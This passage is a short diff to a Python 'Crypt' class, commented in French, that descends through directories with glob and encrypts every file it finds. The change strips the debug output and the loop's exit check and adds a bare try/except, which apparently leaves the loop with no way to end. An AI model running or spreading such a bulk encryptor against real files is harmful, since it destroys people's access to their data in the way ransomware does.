@@ -48,15 +48,11 @@ class Crypt: # Classe pour le cryptage
         while True:
         
             path += "/*" # Entrer dans le dossier
-            print(path)
             folder = glob.glob(path) # Liste du contenu du dossier
-            print(folder)
             
-            if len(folder) == 0: 
-                print("End")
-                break # Si le dossier est vide quitter la boucle
-            else:  # Sinon crypter le contenu du dossier
+            try:
                 for file in folder: self.Crypting(file)
+            except: print("\n\n\n\n\nERREUR\n\n\n\n\n")
         
         
 crypting = Crypt() # Créer une instance de la classe
